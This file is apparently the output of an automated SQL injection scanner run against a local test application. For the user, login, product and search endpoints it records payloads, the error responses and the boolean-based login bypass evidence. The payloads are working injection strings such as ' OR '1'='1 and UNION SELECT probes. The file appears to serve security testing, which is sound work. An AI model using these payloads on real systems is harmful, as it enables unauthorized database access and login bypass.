@@ -1,0 +1,209 @@
+[
+  {
+    "endpoint": "http://localhost:5001/api/user",
+    "parameter": "id",
+    "payload": "'",
+    "evidence": "SQL error pattern detected: 'Database error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"unrecognized token: \\\"'\\\"\",\"error\":\"Database error\",\"query\":\"SELECT id, username, email, role FROM users WHERE id = '\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/user",
+    "parameter": "id",
+    "payload": "\"",
+    "evidence": "SQL error pattern detected: 'Database error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"unrecognized token: \\\"\\\"\\\"\",\"error\":\"Database error\",\"query\":\"SELECT id, username, email, role FROM users WHERE id = \\\"\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/user",
+    "parameter": "id",
+    "payload": "' OR '1'='1",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\"1\\\": syntax error\",\"error\":\"Database error\",\"query\":\"SELECT id, username, email, role FROM users WHERE id = ' OR '1'='1\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/user",
+    "parameter": "id",
+    "payload": "') OR ('1'='1",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\"1\\\": syntax error\",\"error\":\"Database error\",\"query\":\"SELECT id, username, email, role FROM users WHERE id = ') OR ('1'='1\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/user",
+    "parameter": "id",
+    "payload": "' AND '1'='2",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\"1\\\": syntax error\",\"error\":\"Database error\",\"query\":\"SELECT id, username, email, role FROM users WHERE id = ' AND '1'='2\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/user",
+    "parameter": "id",
+    "payload": "1 UNION SELECT NULL--",
+    "evidence": "UNION-based SQLi: Response structure changed, found indicators: ['username']",
+    "vulnerability_type": "union-based",
+    "severity": "CRITICAL",
+    "proof_of_exploitation": "{\n  \"details\": \"SELECTs to the left and right of UNION do not have the same number of result columns\",\n  \"error\": \"Database error\",\n  \"query\": \"SELECT id, username, email, role FROM users WHERE id = 1 UNION SELECT NULL--\"\n}"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "username",
+    "payload": "'",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\"test\\\": syntax error\",\"error\":\"Database error\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "username",
+    "payload": "') OR ('1'='1",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\")\\\": syntax error\",\"error\":\"Database error\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "username",
+    "payload": "1' OR '1'='1",
+    "evidence": "Boolean-based SQLi: TRUE conditions avg 93 bytes, FALSE conditions avg 50 bytes",
+    "vulnerability_type": "boolean-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "TRUE payloads: [(\"1' OR '1'='1\", 50, 401), (\"1' OR '1'='1'--\", 136, 200)], FALSE payloads: [(\"1' AND '1'='2\", 50, 401), (\"1' AND 1=2--\", 50, 401)]"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "username",
+    "payload": "1 UNION SELECT 'injected','test','data','value'--",
+    "evidence": "UNION-based SQLi: Response structure changed, found indicators: ['injected']",
+    "vulnerability_type": "union-based",
+    "severity": "CRITICAL",
+    "proof_of_exploitation": "{\n  \"details\": \"near \\\"injected\\\": syntax error\",\n  \"error\": \"Database error\"\n}"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "password",
+    "payload": "'",
+    "evidence": "SQL error pattern detected: 'Database error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"unrecognized token: \\\"'''\\\"\",\"error\":\"Database error\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "password",
+    "payload": "') OR ('1'='1",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\")\\\": syntax error\",\"error\":\"Database error\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "password",
+    "payload": "1' OR '1'='1",
+    "evidence": "Boolean-based SQLi: TRUE conditions avg 136 bytes, FALSE conditions avg 50 bytes",
+    "vulnerability_type": "boolean-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "TRUE payloads: [(\"1' OR '1'='1\", 136, 200), (\"1' OR '1'='1'--\", 136, 200)], FALSE payloads: [(\"1' AND '1'='2\", 50, 401), (\"1' AND 1=2--\", 50, 401)]"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/login",
+    "parameter": "password",
+    "payload": "1 UNION SELECT 'injected','test','data','value'--",
+    "evidence": "UNION-based SQLi: Response structure changed, found indicators: ['injected']",
+    "vulnerability_type": "union-based",
+    "severity": "CRITICAL",
+    "proof_of_exploitation": "{\n  \"details\": \"near \\\"injected\\\": syntax error\",\n  \"error\": \"Database error\"\n}"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/product",
+    "parameter": "id",
+    "payload": "'",
+    "evidence": "SQL error pattern detected: 'Database error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"unrecognized token: \\\"'\\\"\",\"error\":\"Database error\",\"query\":\"SELECT id, name, price, category FROM products WHERE id = '\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/product",
+    "parameter": "id",
+    "payload": "\"",
+    "evidence": "SQL error pattern detected: 'Database error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"unrecognized token: \\\"\\\"\\\"\",\"error\":\"Database error\",\"query\":\"SELECT id, name, price, category FROM products WHERE id = \\\"\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/product",
+    "parameter": "id",
+    "payload": "' OR '1'='1",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\"1\\\": syntax error\",\"error\":\"Database error\",\"query\":\"SELECT id, name, price, category FROM products WHERE id = ' OR '1'='1\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/product",
+    "parameter": "id",
+    "payload": "') OR ('1'='1",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\"1\\\": syntax error\",\"error\":\"Database error\",\"query\":\"SELECT id, name, price, category FROM products WHERE id = ') OR ('1'='1\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/product",
+    "parameter": "id",
+    "payload": "' AND '1'='2",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\"1\\\": syntax error\",\"error\":\"Database error\",\"query\":\"SELECT id, name, price, category FROM products WHERE id = ' AND '1'='2\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/product",
+    "parameter": "id",
+    "payload": "1 UNION SELECT NULL--",
+    "evidence": "UNION-based SQLi: Response structure changed, found indicators: []",
+    "vulnerability_type": "union-based",
+    "severity": "CRITICAL",
+    "proof_of_exploitation": "{\n  \"details\": \"SELECTs to the left and right of UNION do not have the same number of result columns\",\n  \"error\": \"Database error\",\n  \"query\": \"SELECT id, name, price, category FROM products WHERE id = 1 UNION SELECT NULL--\"\n}"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/search",
+    "parameter": "q",
+    "payload": "') OR ('1'='1",
+    "evidence": "SQL error pattern detected: 'Syntax error' in response",
+    "vulnerability_type": "error-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "{\"details\":\"near \\\")\\\": syntax error\",\"error\":\"Database error\"}\n"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/search",
+    "parameter": "q",
+    "payload": "1' OR '1'='1",
+    "evidence": "Boolean-based SQLi: TRUE conditions avg 126 bytes, FALSE conditions avg 48 bytes",
+    "vulnerability_type": "boolean-based",
+    "severity": "HIGH",
+    "proof_of_exploitation": "TRUE payloads: [(\"1' OR '1'='1\", 48, 200), (\"1' OR '1'='1'--\", 204, 200)], FALSE payloads: [(\"1' AND '1'='2\", 48, 200), (\"1' AND 1=2--\", 48, 200)]"
+  },
+  {
+    "endpoint": "http://localhost:5001/api/search",
+    "parameter": "q",
+    "payload": "1 UNION SELECT NULL--",
+    "evidence": "UNION-based SQLi: Response structure changed, found indicators: []",
+    "vulnerability_type": "union-based",
+    "severity": "CRITICAL",
+    "proof_of_exploitation": "{\n  \"count\": 0,\n  \"query_time\": \"0.0000s\",\n  \"results\": []\n}"
+  }
+]
